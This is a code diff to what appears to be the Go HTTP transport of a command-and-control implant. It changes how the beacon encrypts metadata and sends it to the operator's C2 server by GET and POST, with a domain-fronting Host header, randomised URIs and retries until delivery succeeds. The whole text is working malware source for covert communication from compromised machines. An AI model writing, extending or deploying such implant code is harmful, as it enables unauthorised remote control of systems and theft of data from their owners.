@@ -28,8 +28,8 @@ func init() {
 				os.Exit(1)
 			}
 		}
-		if config.DomainFrontHost != "" {
-			config.HttpHeaders["Host"] = config.DomainFrontHost
+		if config.HostName != "" {
+			config.HttpHeaders["Host"] = config.HostName
 		}
 		trans, _ := httpRequest.Client().Transport.(*http.Transport)
 		trans.MaxIdleConns = 20
@@ -43,8 +43,6 @@ func init() {
 // need to handler c2profile here
 func HttpPost(data []byte) *req.Resp {
 	data = util.EncryptField(config.PostClientDataEncryptType, data)
-	// add custom header here
-	headers := config.HttpHeaders
 
 	var param req.QueryParam
 	var header req.Header
@@ -66,7 +64,7 @@ func HttpPost(data []byte) *req.Resp {
 	// push result may need to continually send packets until success
 	for {
 		url := config.Host + config.PostUri[rand.Intn(len(config.PostUri))]
-		resp, err := httpRequest.Post(url, data, headers, header, param)
+		resp, err := httpRequest.Post(url, data, config.HttpHeaders, header, param)
 		if err != nil {
 			util.Printf("!error: %v\n", err)
 			util.Sleep()
@@ -85,18 +83,24 @@ func HttpPost(data []byte) *req.Resp {
 
 // HttpGet need to handler c2profile here, data is raw rsa encrypted meta info
 func HttpGet(data []byte) ([]byte, error) {
-	// do some copy?
 	buf := bytes.NewBuffer(data)
 	stringData := string(util.EncryptField(config.GetMetaEncryptType, buf.Bytes()))
 	stringData = config.GetClientPrepend + stringData + config.GetClientAppend
 
 	httpHeaders := config.HttpHeaders
-	metaDataHeader := req.Header{config.MetaDataField: stringData}
+	var metaDataHeader req.Header
+	var metaDataQuery req.QueryParam
+	switch config.MetaDataFieldType {
+	case "header":
+		metaDataHeader = req.Header{config.MetaDataField: stringData}
+	case "parameter":
+		metaDataQuery = req.QueryParam{config.MetaDataField: stringData}
+	}
 
 	url := config.Host + config.GetUri[rand.Intn(len(config.GetUri))]
 
 	// provide 2 header args is supported
-	resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader)
+	resp, err := httpRequest.Get(url, httpHeaders, metaDataHeader, metaDataQuery)
 	// if error occurred, just wait for next time
 	if err != nil {
 		return nil, err
